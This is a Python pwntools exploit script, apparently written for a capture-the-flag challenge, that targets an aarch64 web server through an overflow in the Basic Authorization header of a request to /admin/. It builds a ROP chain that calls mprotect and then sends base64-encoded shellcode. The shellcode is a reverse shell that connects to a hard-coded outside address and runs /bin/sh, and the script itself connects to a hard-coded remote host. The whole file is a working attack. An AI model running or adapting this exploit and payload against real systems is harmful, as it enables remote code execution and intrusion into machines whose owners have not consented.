from pwn import *
from base64 import b64encode, b64decode

context.arch = "aarch64"
context.os = "linux"
context.log_level = "debug"

fmt = '''GET /admin/ HTTP/1.1
Host: 127.0.0.1:80
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: 111111115.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43
Authorization: Basic '''

def set_pack(payload:bytes):
    return fmt.encode()+b64encode(payload)+b"\n\n"

# base: 0x400000
perfet_gadget = '''
ext:0000000000407D78 loc_407D78                              ; CODE XREF: sub_407D30+64↓j
.text:0000000000407D78                 LDR             X3, [X21,X19,LSL#3]
.text:0000000000407D7C                 MOV             X2, X24
.text:0000000000407D80                 MOV             X1, X23
.text:0000000000407D84                 MOV             W0, W22
.text:0000000000407D88                 ADD             X19, X19, #1
.text:0000000000407D8C                 BLR             X3
.text:0000000000407D90                 CMP             X20, X19
.text:0000000000407D94                 B.NE            loc_407D78
.text:0000000000407D98                 LDR             X19, [X29,#0x10]
.text:0000000000407D9C
.text:0000000000407D9C loc_407D9C                              ; CODE XREF: sub_407D30+3C↑j
.text:0000000000407D9C                 LDP             X20, X21, [SP,#0x18]
.text:0000000000407DA0                 LDP             X22, X23, [SP,#0x28]
.text:0000000000407DA4                 LDR             X24, [SP,#0x38]
.text:0000000000407DA8                 LDP             X29, X30, [SP],#0x40
.text:0000000000407DAC                 RET
'''
arg_start = 0x423680
popen_gadget = 0x4062C4

dup2 = 0x401EA0
mprotect = 0x401F20

def exp():
    p = remote("39.106.54.108", 30002)
    payload = b"A"*0x100+p64(arg_start)+p64(0x407D98) # x29 x30
    payload += p64(0xdeadbeef)*2
    #===
    payload += p64(arg_start) + p64(0x407D78) # x29 x30
    payload += p64(0xdeadbeef) # padding
    payload += p64(1) + p64(arg_start) # x20 x21
    payload += p64(0x41c000) + p64(0x15000) # x22 x23
    payload += p64(7) # x24
    #===
    payload += p64(arg_start) + p64(arg_start+0x20) # x29 x30
    
    pack = set_pack(payload).ljust(0x400, b"\x00")
    # args
    f = {}
    f[0x0] = p64(mprotect)
    f[0x10] = p64(0) #x19
    f[0x18] = p64(0) #padding
    pack += fit(f) + b64decode(b"QACA0iEAgNICAIDSyBiA0gEAANTjAwCqQQMAEAICgNJoGYDSAQAA1GACADXgAwOqAgCA0gEAgNIIA4DSAQAA1CEAgNIIA4DSAQAA1EEAgNIIA4DSAQAA1IABABACAIDS4AMA+eIHAPnhAwCRqBuA0gEAANQAAIDSqAuA0gEAANQCACcVi+DDOS9iaW4vc2gAAAAAAAAAAAA=")
    p.send(pack)

    p.interactive()
if __name__ == "__main__":
    exp()
